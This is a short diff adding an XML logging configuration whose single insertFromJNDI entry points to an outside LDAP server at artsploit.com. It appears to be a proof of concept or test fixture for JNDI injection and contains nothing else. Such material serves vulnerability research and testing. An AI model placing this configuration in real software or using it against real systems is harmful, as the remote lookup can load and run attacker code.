@@ -1,0 +1,3 @@
+<configuration>
+<insertFromJNDI env-entry-name="ldap://artsploit.com:1389/jndi" as="appName"/>
+</configuration>
